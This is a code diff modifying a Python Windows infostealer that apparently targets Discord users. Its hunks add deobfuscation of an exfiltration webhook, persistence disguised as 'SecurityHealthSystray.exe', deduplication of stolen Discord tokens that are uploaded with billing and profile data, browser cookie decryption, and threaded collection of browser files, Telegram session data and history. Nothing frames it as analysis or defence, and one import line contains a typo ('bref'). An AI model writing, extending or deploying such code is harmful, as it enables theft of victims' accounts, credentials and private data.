@@ -1,27 +1,23 @@
 import sys, time, random, threading, ctypes, shutil
 import os, re, socket, json, sqlite3, zipfile, subprocess
-import urllib.request, winreg, base64, getpass, platform
+import urllib.request, winreg, getpass, platform
 from os.path import isfile, exists
-from ctypes import wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from ctypes import wintypes, bref, cdll, Structure, POINTER, c_char, c_buffer
 from json import loads, dumps
 from zipfile import ZipFile
 from shutil import copy
-from sys import executable
-from ctypes import windll
 from urllib.request import Request, urlopen
 from sqlite3 import connect as sql_connect
 from base64 import b64decode
-from json import loads as json_loads, load
-from os import getenv, startfile
+from json import loads as json_loads
 from os.path import isfile
-import winreg, random
-from base64 import b64decode
+import winreg
 import os.path, zipfile
 import shutil, json, sqlite3
-import tempfile, datetime
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+import tempfile
+from sys import executable, stderr
 from ctypes import *
-webhook = '%Webhook%' 
+webhook = '%Webhook%'
 
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -37,7 +33,7 @@ else:
 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"],
+    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
 
 for modl in requirements:
@@ -308,6 +304,17 @@ def create_copy_and_return_new_path():
     
     return new_path
 
+def deobf(encrypted_text, key):
+    decrypted = [0] * 256
+    for i, char in enumerate(key):
+        decrypted[char] = i
+
+    decrypted_text = []
+    for char in encrypted_text:
+        decrypted_char = decrypted[char]
+        decrypted_text.append(decrypted_char)
+    return bytes(decrypted_text)
+
 def add_to_startup(new_path):
     faked = 'SecurityHealthSystray.exe'
     addrs = f"{sys.executable} {new_path}"
@@ -344,6 +351,9 @@ def startup():
 
 
 def LoadUrlib(hook, data='', files='', headers=''):
+    
+    hook = deobf(webhook[0],webhook[1]).decode()
+    print(hook)
     for i in range(8):
         try:
             if headers != '':
@@ -715,8 +725,12 @@ def GetBilling(Tokq):
     return billing
 
 
+processed_tokens = []
+
 
 def uploadTokq(Tokq, path):
+    if Tokq in processed_tokens:
+        return
     username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
@@ -814,6 +828,7 @@ def uploadTokq(Tokq, path):
         data = data[:character_limit - 3] + "..."
 
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    processed_tokens.append(Tokq)
 
 
 
@@ -1557,7 +1572,7 @@ def getCook(path, arg):
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"{row[0]}   {row[1]}    {DecryptValue(row[2], master_key)}")
+                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
                 CookiCount += 1
         
 
@@ -1661,6 +1676,9 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
+    a = threading.Thread(target=getinfo)
+    a.start()
+    aa.append(a)
     
     eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     eeee.start()
@@ -1705,11 +1723,6 @@ def GatherAll():
     a = threading.Thread(target=FirefoxCookie)
     a.start()
     aa.append(a)
-
-    a = threading.Thread(target=getinfo)
-    a.start()
-    aa.append(a)
-    aa = []
     
     hist = threading.Thread(target=histup)
     hist.start()
